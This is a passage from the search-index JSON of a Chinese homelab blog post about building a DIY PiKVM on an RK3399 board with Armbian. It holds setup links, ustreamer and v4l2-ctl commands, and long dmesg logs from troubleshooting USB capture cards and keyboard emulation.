s905w, s905, s905l, rk3588, rk3568, rk3399, rk3328, h6, etc. (github.com)</p> <ul> <li>\u9002\u914dking3399\u7684\u63d0\u4ea4\uff1aAdd support for king3399 by 13584452567 \u00b7 Pull Request #1080 \u00b7 ophub/amlogic-s9xxx-armbian (github.com)</li> </ul> <p>armbian\u5b98\u65b9\u6587\u6863\u5173\u4e8erk3399\u7684\u4e00\u4e9b\u6ce8\u91ca\uff0c\u6bd4\u5982\u663e\u5361\u53ea\u57284.4\u5185\u6838\u4e0a\u6b63\u5e38\u5de5\u4f5cRockchip - Armbian Documentation</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<ul> <li>\u5b98\u65b9\u6587\u6863\u5f88\u5168\u4e86\uff1aArmbian Documentation</li> <li>network\uff1aHow to switch from Network Manager to systemd-networkd on Linux (xmodulo.com)</li> </ul> <p>\u8fde\u63a5wifi\u7684\u7b80\u5355\u65b9\u6cd5 <pre><code>armbian-config   # \u914d\u7f6e\u6574\u4e2a\u7cfb\u7edf\uff0c\u751a\u81f3\u53ef\u4ee5\u7f16\u8f91dts\n\nnmtui\n</code></pre></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#armbian-pi-kvm\u5b89\u88c5","title":"Armbian PI-KVM\u5b89\u88c5","text":"<ul> <li>\u6253\u9020\u666e\u901aPC\u62e5\u6709\u670d\u52a1\u5668IPMI\u786c\u4ef6\u7ea7\u522b\u7684\u8fdc\u7a0b\u8fd0\u7ef4\u65b9\u6848 PI KVM \u786c\u4ef6\u7ea7\u8fdc\u7a0b\u63a7\u5236_\u54d4\u54e9\u54d4\u54e9_bilibili</li> <li>\u6559\u7a0b https://github.com/toss-a/pikvm-armbian/blob/master/README-zh-CN.MD</li> <li>\u4f5c\u8005\u7684\u4ed3\u5e93\uff1asrepac/kvmd-armbian: KVMD For Armbian Install Script (github.com)</li> </ul>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#kvm\u6ca1\u6709\u753b\u9762","title":"KVM\u6ca1\u6709\u753b\u9762","text":"<p>\u53d1\u73b0\u4e70\u7684ms2130\u5728linux\u4e0b\uff0cusb3.0\u65e0\u6cd5\u5de5\u4f5c\u3002\u53ea\u80fdusb\u63a5\u53e3\u63d2\u5165\u4e00\u534a\uff0c\u4f7f\u5176\u6210\u4e3a2.0\u65f6\uff0clinux\u4e0b\u624d\u80fd\u6b63\u5e38\u5de5\u4f5c\u3002</p> <pre><code>/usr/bin/ustreamer --device=/dev/kvmd-video --persistent --format=mjpeg --resolution=1280x720 --desired-fps=40 --drop-same-frames=30 --last-as-blank=0 --unix=/run/kvmd/ustreamer.sock --unix-rm --unix-mode=0660 --exit-on-parent-death --process-name-prefix=kvmd/streamer --notify-parent --no-log-colors --sink=kvmd::ustreamer::jpeg --sink-mode=0660 --slowdown\n</code></pre> <pre><code>Jul 23 09:18:17 king3399 kvmd[382354]: kvmd.apps.kvmd.streamer           INFO --- =&gt; -- INFO  [36009.992    stream] -- Device fd=9 opened\nJul 23 09:18:17 king3399 kvmd[382354]: kvmd.apps.kvmd.streamer           INFO --- =&gt; -- ERROR [36009.992    stream] -- Video capture is not supported by device\nJul 23 09:18:17 king3399 kvmd[382354]: kvmd.apps.kvmd.streamer           INFO --- =&gt; -- INFO  [36009.992    stream] -- Device fd=9 closed\n</code></pre> <p>dmesg <pre><code>[Sat Jul 22 23:18:09 2023] ehci-platform fe380000.usb: EHCI Host Controller\n[Sat Jul 22 23:18:09 2023] ehci-platform fe380000.usb: new USB bus registered, assigned bus number 1\n[Sat Jul 22 23:18:09 2023] ehci-platform fe380000.usb: irq 70, io mem 0xfe380000\n[Sat Jul 22 23:18:09 2023] ehci-platform fe3c0000.usb: EHCI Host Controller\n[Sat Jul 22 23:18:09 2023] ehci-platform fe3c0000.usb: new USB bus registered, assigned bus number 2\n[Sat Jul 22 23:18:09 2023] ehci-platform fe3c0000.usb: irq 71, io mem 0xfe3c0000\n\n[Sat Jul 22 23:18:09 2023] ehci-platform fe380000.usb: USB 2.0 started, EHCI 1.00\n[Sat Jul 22 23:18:09 2023] usb usb1: New USB device found, idVendor=1d6b, idProduct=0002, bcdDevice= 6.01\n[Sat Jul 22 23:18:09 2023] usb usb1: New USB device strings: Mfr=3, Product=2, SerialNumber=1\n[Sat Jul 22 23:18:09 2023] usb usb1: Product: EHCI Host Controller\n[Sat Jul 22 23:18:09 2023] usb usb1: Manufacturer: Linux 6.1.39-ophub ehci_hcd\n[Sat Jul 22 23:18:09 2023] usb usb1: SerialNumber: fe380000.usb\n[Sat Jul 22 23:18:09 2023] hub 1-0:1.0: USB hub found\n[Sat Jul 22 23:18:09 2023] hub 1-0:1.0: 1 port detected\n[Sat Jul 22 23:18:09 2023] usb usb2: New USB device found, idVendor=1d6b, idProduct=0002, bcdDevice= 6.01\n[Sat Jul 22 23:18:09 2023] usb usb2: New USB device strings: Mfr=3, Product=2, SerialNumber=1\n[Sat Jul 22 23:18:09 2023] usb usb2: Product: EHCI Host Controller\n[Sat Jul 22 23:18:09 2023] usb usb2: Manufacturer: Linux 6.1.39-ophub ehci_hcd\n[Sat Jul 22 23:18:09 2023] usb usb2: SerialNumber: fe3c0000.usb\n[Sat Jul 22 23:18:09 2023] hub 2-0:1.0: USB hub found\n[Sat Jul 22 23:18:09 2023] hub 2-0:1.0: 1 port detected\n\n[Sat Jul 22 23:18:10 2023] ohci-platform fe3a0000.usb: Generic Platform OHCI controller\n[Sat Jul 22 23:18:10 2023] ohci-platform fe3e0000.usb: Generic Platform OHCI controller\n[Sat Jul 22 23:18:10 2023] ohci-platform fe3a0000.usb: new USB bus registered, assigned bus number 3\n[Sat Jul 22 23:18:10 2023] ohci-platform fe3a0000.usb: irq 78, io mem 0xfe3a0000\n[Sat Jul 22 23:18:10 2023] ohci-platform fe3e0000.usb: new USB bus registered, assigned bus number 4\n[Sat Jul 22 23:18:10 2023] ohci-platform fe3e0000.usb: irq 79, io mem 0xfe3e0000\n[Sat Jul 22 23:18:10 2023] OF: graph: no port node found in /i2c@ff3d0000/fusb302@22\n\n[Sat Jul 22 23:18:10 2023] usb usb3: New USB device found, idVendor=1d6b, idProduct=0001, bcdDevice= 6.01\n[Sat Jul 22 23:18:10 2023] usb usb3: New USB device strings: Mfr=3, Product=2, SerialNumber=1\n[Sat Jul 22 23:18:10 2023] usb usb3: Product: Generic Platform OHCI controller\n[Sat Jul 22 23:18:10 2023] usb usb3: Manufacturer: Linux 6.1.39-ophub ohci_hcd\n[Sat Jul 22 23:18:10 2023] usb usb3: SerialNumber: fe3a0000.usb\n[Sat Jul 22 23:18:10 2023] hub 3-0:1.0: USB hub found\n[Sat Jul 22 23:18:10 2023] hub 3-0:1.0: 1 port detected\n[Sat Jul 22 23:18:10 2023] usb usb4: New USB device found, idVendor=1d6b, idProduct=0001, bcdDevice= 6.01\n[Sat Jul 22 23:18:10 2023] usb usb4: New USB device strings: Mfr=3, Product=2, SerialNumber=1\n[Sat Jul 22 23:18:10 2023] usb usb4: Product: Generic Platform OHCI controller\n[Sat Jul 22 23:18:10 2023] usb usb4: Manufacturer: Linux 6.1.39-ophub ohci_hcd\n[Sat Jul 22 23:18:10 2023] usb usb4: SerialNumber: fe3e0000.usb\n[Sat Jul 22 23:18:10 2023] hub 4-0:1.0: USB hub found\n[Sat Jul 22 23:18:10 2023] hub 4-0:1.0: 1 port detected\n</code></pre></p> <p>\u63d2\u5728tianyi\u7b14\u8bb0\u672c\u4e0a\uff0c\u5185\u6838\u6709\u8bc6\u522b\u5230 <pre><code># dmesg\n[Sun Jul 23 01:19:21 2023] usb 1-4: new high-speed USB device number 6 using xhci_hcd\n[Sun Jul 23 01:19:21 2023] usb 1-4: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=21.00\n[Sun Jul 23 01:19:21 2023] usb 1-4: New USB device strings: Mfr=1, Product=5, SerialNumber=7\n[Sun Jul 23 01:19:21 2023] usb 1-4: Product: USB2 Video\n[Sun Jul 23 01:19:21 2023] usb 1-4: Manufacturer: MACROSILICON\n[Sun Jul 23 01:19:21 2023] usb 1-4: SerialNumber: 20210621\n[Sun Jul 23 01:19:21 2023] usb 1-4: Found UVC 1.00 device USB2 Video (345f:2130)\n[Sun Jul 23 01:19:21 2023] usbcore: registered new interface driver usbhid\n[Sun Jul 23 01:19:21 2023] usbhid: USB HID core driver\n[Sun Jul 23 01:19:21 2023] usbcore: registered new interface driver snd-usb-audio\n[Sun Jul 23 01:19:21 2023] hid-generic 0003:345F:2130.0001: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB2 Video] on usb-0000:00:14.0-4/input4\n\n# lsusb\n...\nBus 001 Device 006: ID 345f:2130 MACROSILICON USB2 Video\n</code></pre></p> <p></p> <pre><code>[Sun Jul 23 10:17:35 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Sun Jul 23 10:17:35 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n[Sun Jul 23 10:17:35 2023] configfs-gadget.kvmd gadget.0: End Point Request ERROR: -108\n</code></pre> <pre><code>v4l2-ctl --list-devices\nv4l2-ctl --list-formats-ext\n</code></pre>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u952e\u76d8\u4e0d\u5de5\u4f5c","title":"\u952e\u76d8\u4e0d\u5de5\u4f5c","text":"<p>\u63d2\u62d4\u65f6\uff0cryzen\u4e0admesg\u770b\u5230\u4ee5\u4e0b\u4fe1\u606f\u3002web\u4e2d\u952e\u76d8\u4e0d\u5de5\u4f5c <pre><code>[Tue Oct  3 18:28:12 2023] usb usb3-port3: attempt power cycle\n[Tue Oct  3 18:28:12 2023] usb 3-3: new full-speed USB device number 16 using xhci_hcd\n[Tue Oct  3 18:28:12 2023] usb 3-3: Device not responding to setup address.\n[Tue Oct  3 18:28:13 2023] usb 3-3: Device not responding to setup address.\n[Tue Oct  3 18:28:13 2023] usb 3-3: device not accepting address 16, error -71\n</code></pre></p> <p>\u91cd\u542f\u5f00\u53d1\u677f\u540e\uff0c\u6b63\u5e38 <pre><code>[Tue Oct  3 18:28:23 2023] usb 3-3: new high-speed USB device number 18 using xhci_hcd\n[Tue Oct  3 18:28:23 2023] usb 3-3: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Oct  3 18:28:23 2023] usb 3-3: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Oct  3 18:28:23 2023] usb 3-3: Product: Composite KVM Device\n[Tue Oct  3 18:28:23 2023] usb 3-3: Manufacturer: PiKVM\n[Tue Oct  3 18:28:23 2023] usb 3-3: SerialNumber: CAFEBABE\n[Tue Oct  3 18:28:23 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3:1.0/0003:1D6B:0104.0006/input/input7\n[Tue Oct  3 18:28:23 2023] hid-generic 0003:1D6B:0104.0006: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:0a:00.3-3/input0\n</code></pre></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#usb","title":"USB","text":"<p>\u6269\u5c55\u575e\u4e0a <pre><code>[Wed Nov 29 15:52:01 2023] usb 1-1.4: new high-speed USB device number 10 using xhci_hcd\n[Wed Nov 29 15:52:01 2023] usb 1-1.4: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=21.00\n[Wed Nov 29 15:52:01 2023] usb 1-1.4: New USB device strings: Mfr=1, Product=2, SerialNumber=7\n[Wed Nov 29 15:52:01 2023] usb 1-1.4: Product: USB3.0 UHD\n[Wed Nov 29 15:52:01 2023] usb 1-1.4: Manufacturer: MACROSILICON\n[Wed Nov 29 15:52:01 2023] usb 1-1.4: SerialNumber: 20210621\n[Wed Nov 29 15:52:01 2023] usb 1-1.4: Found UVC 1.00 device USB3.0 UHD (345f:2130)\n[Wed Nov 29 15:52:01 2023] hid-generic 0003:345F:2130.000B: hiddev1,hidraw0: USB HID v1.10 Device [MACROSILICON USB3.0 UHD] on usb-0000:02:00.0-1.4/input4\n</code></pre></p> <p>\u80cc\u677fusb3.0 <pre><code>[Wed Nov 29 16:14:47 2023] usb 4-1: new SuperSpeed USB device number 3 using xhci_hcd\n[Wed Nov 29 16:14:47 2023] usb 4-1: LPM exit latency is zeroed, disabling LPM.\n[Wed Nov 29 16:14:47 2023] usb 4-1: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=31.00\n[Wed Nov 29 16:14:47 2023] usb 4-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Wed Nov 29 16:14:47 2023] usb 4-1: Product: USB3.0 UHD\n[Wed Nov 29 16:14:47 2023] usb 4-1: Manufacturer: MACROSILICON\n[Wed Nov 29 16:14:47 2023] usb 4-1: SerialNumber: 20210623\n[Wed Nov 29 16:14:47 2023] usb 4-1: Found UVC 1.00 device USB3.0 UHD (345f:2130)\n[Wed Nov 29 16:14:47 2023] hid-generic 0003:345F:2130.000C: hiddev1,hidraw0: USB HID v1.10 Device [MACROSILICON USB3.0 UHD] on usb-0000:0a:00.3-1/input4\n</code></pre></p> <p>\u524d\u9762\u677fusb3.0\u65e0\u53cd\u5e94</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u91c7\u96c6\u5361","title":"\u91c7\u96c6\u5361","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#ms2109","title":"ms2109","text":"<pre><code>[Tue Jul 25 14:54:59 2023] usb 1-3: new high-speed USB device number 8 using xhci_hcd\n[Tue Jul 25 14:55:06 2023] usb 1-3: new high-speed USB device number 9 using xhci_hcd\n[Tue Jul 25 14:55:06 2023] usb 1-3: New USB device found, idVendor=1de1, idProduct=f105, bcdDevice= 4.09\n[Tue Jul 25 14:55:06 2023] usb 1-3: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 14:55:06 2023] usb 1-3: Product: Display capture-UVC05\n[Tue Jul 25 14:55:06 2023] usb 1-3: Manufacturer: Actions Micro\n[Tue Jul 25 14:55:06 2023] usb 1-3: SerialNumber: -1877663977\n[Tue Jul 25 14:55:06 2023] usb 1-3: Found UVC 1.00 device Display capture-UVC05 (1de1:f105)\n[Tue Jul 25 14:55:06 2023] usb 1-3: Warning! Unlikely big volume range (=7248), cval-&gt;res is probably wrong.\n[Tue Jul 25 14:55:06 2023] usb 1-3: [3] FU [Mic Capture Volume] ch = 1, val = -7264/-16/1\n\n\n\u279c  ~ v4l2-ctl --list-formats-ext\nioctl: VIDIOC_ENUM_FMT\n        Type: Video Capture\n\n        [0]: 'MJPG' (Motion-JPEG, compressed)\n                Size: Discrete 1920x1080\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1360x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1280x1024\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1280x960\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1280x720\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1024x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 800x600\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 720x576\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 720x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 640x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n\n\n\u279c  ~ v4l2-ctl --all\nDriver Info:\n        Driver name      : uvcvideo\n        Card type        : Display capture-UVC05: Display\n        Bus info         : usb-0000:02:00.0-3\n        Driver version   : 5.15.99\n        Capabilities     : 0x84a00001\n                Video Capture\n                Metadata Capture\n                Streaming\n                Extended Pix Format\n                Device Capabilities\n        Device Caps      : 0x04200001\n                Video Capture\n                Streaming\n                Extended Pix Format\nMedia Driver Info:\n        Driver name      : uvcvideo\n        Model            : Display capture-UVC05: Display\n        Serial           : -1877663977\n        Bus info         : usb-0000:02:00.0-3\n        Media version    : 5.15.99\n        Hardware revision: 0x00000409 (1033)\n        Driver version   : 5.15.99\nInterface Info:\n        ID               : 0x03000002\n        Type             : V4L Video\nEntity Info:\n        ID               : 0x00000001 (1)\n        Name             : Display capture-UVC05: Display\n        Function         : V4L2 I/O\n        Flags            : default\n        Pad 0x01000007   : 0: Sink\n          Link 0x0200000d: from remote pad 0x100000a of entity 'Processing 2' (Video Pixel Formatter): Data, Enabled, Immutable\nPriority: 2\nVideo input : 0 (Camera 1: ok)\nFormat Video Capture:\n        Width/Height      : 1920/1080\n        Pixel Format      : 'MJPG' (Motion-JPEG)\n        Field             : None\n        Bytes per Line    : 0\n        Size Image        : 3110400\n        Colorspace        : sRGB\n        Transfer Function : Rec. 709\n        YCbCr/HSV Encoding: ITU-R 601\n        Quantization      : Default (maps to Full Range)\n        Flags             :\nCrop Capability Video Capture:\n        Bounds      : Left 0, Top 0, Width 1920, Height 1080\n        Default     : Left 0, Top 0, Width 1920, Height 1080\n        Pixel Aspect: 1/1\nSelection Video Capture: crop_default, Left 0, Top 0, Width 1920, Height 1080, Flags:\nSelection Video Capture: crop_bounds, Left 0, Top 0, Width 1920, Height 1080, Flags:\nStreaming Parameters Video Capture:\n        Capabilities     : timeperframe\n        Frames per second: 60.000 (60/1)\n        Read buffers     : 0\n\nCamera Controls\n\n                  auto_exposure 0x009a0901 (menu)   : min=0 max=3 default=0 value=0 (Auto Mode)\n                                0: Auto Mode\n</code></pre>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#ms2130","title":"ms2130","text":"<pre><code>\u279c  ~ sudo dmesg --color=always -W\n[264156.578383] usb 2-3: new SuperSpeed USB device number 2 using xhci_hcd\n[264156.614502] usb 2-3: LPM exit latency is zeroed, disabling LPM.\n[264156.639256] usb 2-3: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=31.00\n[264156.641654] usb 2-3: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[264156.644154] usb 2-3: Product: USB3 Video\n[264156.646540] usb 2-3: Manufacturer: MACROSILICON\n[264156.648972] usb 2-3: SerialNumber: 20210623\n[264156.676445] usb 2-3: Found UVC 1.00 device USB3 Video (345f:2130)\n[264156.735960] hid-generic 0003:345F:2130.000F: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB3 Video] on usb-0000:02:00.0-3/input4\n\nBus 002 Device 002: ID 345f:2130 MACROSILICON USB3 Video\n\n\u279c  ~ v4l2-ctl --list-formats-ext\nioctl: VIDIOC_ENUM_FMT\n        Type: Video Capture\n\n        [0]: 'YUYV' (YUYV 4:2:2)\n                Size: Discrete 3840x2160\n                        Interval: Discrete 0.056s (18.000 fps)\n                Size: Discrete 2560x1600\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2560x1440\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1152\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1080\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1920x2160\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1920x1200\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1920x1080\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1360x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1280x1024\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1280x960\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1280x720\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1024x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 720x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 640x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n        [1]: 'MJPG' (Motion-JPEG, compressed)\n                Size: Discrete 3840x2160\n                        Interval: Discrete 0.056s (18.000 fps)\n                Size: Discrete 2560x1600\n                Size: Discrete 2560x1440\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1152\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1080\n                Size: Discrete 1920x2160\n                Size: Discrete 1920x1200\n                Size: Discrete 1920x1080\n                Size: Discrete 1360x768\n                Size: Discrete 1280x1024\n                Size: Discrete 1280x960\n</code></pre> <p>\u51fa\u95ee\u9898 <pre><code>\u279c  ~ sudo dmesg --color=always --ctime -W\n[Tue Jul 25 16:47:39 2023] usb 1-3: new high-speed USB device number 29 using xhci_hcd\n[Tue Jul 25 16:47:39 2023] usb 1-3: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=21.00\n[Tue Jul 25 16:47:39 2023] usb 1-3: New USB device strings: Mfr=1, Product=5, SerialNumber=7\n[Tue Jul 25 16:47:39 2023] usb 1-3: Product: USB2 Video\n[Tue Jul 25 16:47:39 2023] usb 1-3: Manufacturer: MACROSILICON\n[Tue Jul 25 16:47:39 2023] usb 1-3: SerialNumber: 20210621\n[Tue Jul 25 16:47:39 2023] usb 1-3: Found UVC 1.00 device USB2 Video (345f:2130)\n[Tue Jul 25 16:47:39 2023] hid-generic 0003:345F:2130.0012: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB2 Video] on usb-0000:02:00.0-3/input4\n[Tue Jul 25 16:47:39 2023] usb 1-3: USB disconnect, device number 29\n[Tue Jul 25 16:47:49 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:47:53 2023] usb 1-3: new high-speed USB device number 31 using xhci_hcd\n[Tue Jul 25 16:47:53 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:47:57 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:01 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:05 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:09 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:20 2023] usb 1-3: new high-speed USB device number 32 using xhci_hcd\n[Tue Jul 25 16:48:21 2023] usb 1-3: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=21.00\n[Tue Jul 25 16:48:21 2023] usb 1-3: New USB device strings: Mfr=1, Product=5, SerialNumber=7\n[Tue Jul 25 16:48:21 2023] usb 1-3: Product: USB2 Video\n[Tue Jul 25 16:48:21 2023] usb 1-3: Manufacturer: MACROSILICON\n[Tue Jul 25 16:48:21 2023] usb 1-3: SerialNumber: 20210621\n[Tue Jul 25 16:48:21 2023] usb 1-3: Found UVC 1.00 device USB2 Video (345f:2130)\n[Tue Jul 25 16:48:21 2023] hid-generic 0003:345F:2130.0013: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB2 Video] on usb-0000:02:00.0-3/input4\n[Tue Jul 25 16:50:24 2023] usb 1-3: USB disconnect, device number 32\n[Tue Jul 25 16:50:44 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n</code></pre></p> <ul> <li>ms2109\u5728windows\u4e0b\u80fd\u6b63\u5e38\u5de5\u4f5c</li> <li>\u5728linux\u4e0b\uff0custream\u62a5 <pre><code>-- INFO  [268879.670    stream] -- Device fd=8 opened\n-- INFO  [268879.670    stream] -- Using input channel: 0\n-- INFO  [268879.685    stream] -- Using resolution: 640x480\n-- ERROR [268879.685    stream] -- Could not obtain the requested pixelformat=YUYV; driver gave us MJPEG\n-- INFO  [268879.685    stream] -- Falling back to pixelformat=MJPEG\n-- INFO  [268879.685    stream] -- Using pixelformat: MJPEG\n-- INFO  [268879.700    stream] -- Using HW FPS: 0 -&gt; 60 (coerced)\n-- ERROR [268879.700    stream] -- Device does not support setting of HW encoding quality parameters\n-- INFO  [268879.700    stream] -- Using IO method: MMAP\n-- INFO  [268879.702    stream] -- Requested 5 device buffers, got 5\n-- INFO  [268879.704    stream] -- Capturing started\n-- INFO  [268879.704    stream] -- Switching to HW encoder: the input is (M)JPEG ...\n-- INFO  [268879.704    stream] -- Using JPEG quality: encoder default\n-- INFO  [268879.704    stream] -- Creating pool JPEG with 1 workers ...\n-- INFO  [268879.704    stream] -- Capturing ...\n-- ERROR [268880.714    stream] -- Mainloop select() error: Inappropriate ioctl for device\n-- 